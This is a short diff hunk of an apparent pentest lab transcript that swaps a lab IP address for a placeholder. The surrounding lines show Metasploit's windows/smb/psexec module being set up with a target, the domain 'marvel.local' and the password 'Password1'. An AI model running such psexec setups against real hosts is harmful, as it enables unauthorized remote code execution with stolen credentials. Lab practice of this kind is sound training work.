@@ -61,8 +61,8 @@ Exploit target:<br/>
  0  Automatic<br/>
 <br/>
 <br/>
-msf6 exploit(windows/smb/psexec) &gt; set rhosts 192.168.247.135<br/>
-rhosts =&gt; 192.168.247.135<br/>
+msf6 exploit(windows/smb/psexec) &gt; set rhosts <IP><br/>
+rhosts =&gt; <IP><br/>
 msf6 exploit(windows/smb/psexec) &gt; set smbdomain marvel.local<br/>
 smbdomain =&gt; marvel.local<br/>
 msf6 exploit(windows/smb/psexec) &gt; set smbpass Password1<br/>
